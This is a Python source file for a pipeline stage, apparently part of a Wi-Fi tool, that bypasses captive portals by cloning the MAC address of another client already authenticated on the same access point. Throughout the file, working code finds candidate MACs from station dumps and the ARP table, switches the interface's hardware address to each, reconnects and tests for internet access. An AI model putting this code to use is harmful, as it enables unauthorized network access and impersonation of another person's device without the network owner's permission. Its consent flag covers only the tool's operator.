"""MAC Clone Stage — bypass captive portals by cloning an authenticated client's MAC.

When a captive portal blocks internet access and auto-authentication fails,
this stage sniffs for clients that ARE authenticated (have bypassed the portal)
and clones their MAC address to gain the same access.

REQUIRES EXPLICIT USER CONSENT — this stage modifies the network interface's
hardware address and impersonates another device.
"""

import re
import subprocess
import time

from logging_config import get_logger
from vasili import PipelineStage, StageResult, WifiNetwork
import network_isolation

logger = get_logger(__name__)


class MacCloneStage(PipelineStage):
    """Clone an authenticated client's MAC to bypass captive portals."""
    name = 'mac_clone'
    requires_consent = True

    def can_run(self, network: WifiNetwork, card, context: dict) -> bool:
        """Only run if captive portal was detected and auth failed."""
        return (
            context.get('captive_portal_detected', False)
            and not context.get('has_internet', False)
        )

    def run(self, network: WifiNetwork, card, context: dict) -> StageResult:
        original_mac = self._get_current_mac(card.interface)
        if not original_mac:
            return StageResult(
                success=False, has_internet=False,
                context_updates={'mac_cloned': False},
                message='Could not read current MAC address',
            )

        # Find candidate MACs — clients associated with the same AP
        candidates = self._find_candidate_macs(card.interface, network.bssid)
        if not candidates:
            logger.info('No candidate MACs found for cloning')
            return StageResult(
                success=False, has_internet=False,
                context_updates={'mac_cloned': False},
                message='No authenticated clients found to clone',
            )

        logger.info(f'Found {len(candidates)} candidate MACs to try')

        max_attempts = 3
        for i, candidate_mac in enumerate(candidates[:max_attempts]):
            logger.info(
                f'MAC clone attempt {i+1}/{min(len(candidates), max_attempts)}: '
                f'{candidate_mac}'
            )

            # Tear down routing before MAC change
            if card._routing_info:
                network_isolation.teardown_interface_routing(
                    card.interface, card._routing_info
                )
                card._routing_info = None

            # Change MAC
            if not self._set_mac(card.interface, candidate_mac):
                logger.warning(f'Failed to set MAC to {candidate_mac}')
                continue

            # Re-connect to the network
            if not card.connect(network):
                logger.warning('Failed to reconnect after MAC change')
                continue

            # Wait for connection + DHCP
            time.sleep(2)

            # Test connectivity
            if network_isolation.verify_connectivity(card.interface):
                logger.info(f'MAC clone successful: {candidate_mac}')
                return StageResult(
                    success=True, has_internet=True,
                    context_updates={
                        'mac_cloned': True,
                        'original_mac': original_mac,
                        'cloned_mac': candidate_mac,
                        'has_internet': True,
                    },
                    message=f'Cloned MAC {candidate_mac} — internet accessible',
                )

        # All attempts failed — restore original MAC
        logger.info('All MAC clone attempts failed, restoring original')
        self._set_mac(card.interface, original_mac)
        card.connect(network)

        return StageResult(
            success=False, has_internet=False,
            context_updates={
                'mac_cloned': False,
                'original_mac': original_mac,
            },
            message=f'Tried {min(len(candidates), max_attempts)} MACs, none worked',
        )

    @staticmethod
    def _get_current_mac(interface: str) -> str | None:
        """Read the current MAC address of an interface."""
        try:
            result = subprocess.run(
                ['ip', 'link', 'show', interface],
                capture_output=True, text=True, timeout=5,
            )
            # Parse "link/ether AA:BB:CC:DD:EE:FF"
            match = re.search(r'link/ether\s+([0-9a-f:]{17})', result.stdout, re.I)
            if match:
                return match.group(1)
        except Exception as e:
            logger.error(f'Failed to get MAC for {interface}: {e}')
        return None

    @staticmethod
    def _set_mac(interface: str, mac: str) -> bool:
        """Set the MAC address of an interface (requires interface to be down)."""
        try:
            subprocess.run(
                ['ip', 'link', 'set', interface, 'down'],
                check=True, capture_output=True, timeout=5,
            )
            subprocess.run(
                ['ip', 'link', 'set', 'dev', interface, 'address', mac],
                check=True, capture_output=True, timeout=5,
            )
            subprocess.run(
                ['ip', 'link', 'set', interface, 'up'],
                check=True, capture_output=True, timeout=5,
            )
            logger.debug(f'Set {interface} MAC to {mac}')
            return True
        except subprocess.CalledProcessError as e:
            logger.error(f'Failed to set MAC on {interface}: {e}')
            return False

    @staticmethod
    def _find_candidate_macs(interface: str, target_bssid: str) -> list[str]:
        """Find MAC addresses of clients associated with the target AP.

        Uses `iw dev <iface> scan dump` to find stations associated with
        the target BSSID. These are clients that have passed through the
        captive portal and may have internet access.
        """
        candidates = []

        try:
            # Method 1: Parse nmcli/iw for associated stations
            # iw dev <iface> station dump shows clients if we're connected
            result = subprocess.run(
                ['iw', 'dev', interface, 'station', 'dump'],
                capture_output=True, text=True, timeout=10,
            )

            # Parse station MAC addresses
            for line in result.stdout.split('\n'):
                match = re.match(r'Station\s+([0-9a-f:]{17})', line, re.I)
                if match:
                    mac = match.group(1).lower()
                    # Don't clone the AP's own MAC
                    if mac.lower() != target_bssid.lower():
                        candidates.append(mac)

        except Exception as e:
            logger.debug(f'iw station dump failed: {e}')

        if not candidates:
            # Method 2: Look at ARP table for other clients on same subnet
            try:
                result = subprocess.run(
                    ['ip', 'neigh', 'show', 'dev', interface],
                    capture_output=True, text=True, timeout=5,
                )
                for line in result.stdout.strip().split('\n'):
                    if not line:
                        continue
                    # Format: "IP lladdr MAC state"
                    match = re.search(r'lladdr\s+([0-9a-f:]{17})', line, re.I)
                    if match:
                        mac = match.group(1).lower()
                        if mac != target_bssid.lower():
                            candidates.append(mac)
            except Exception as e:
                logger.debug(f'ARP table scan failed: {e}')

        # Deduplicate
        seen = set()
        unique = []
        for mac in candidates:
            if mac not in seen:
                seen.add(mac)
                unique.append(mac)

        return unique

    def get_config_schema(self):
        return {
            'max_clone_attempts': {
                'type': 'int',
                'default': 3,
                'description': 'Maximum number of MAC addresses to try',
            },
            'restore_on_failure': {
                'type': 'bool',
                'default': True,
                'description': 'Restore original MAC if all clone attempts fail',
            },
        }
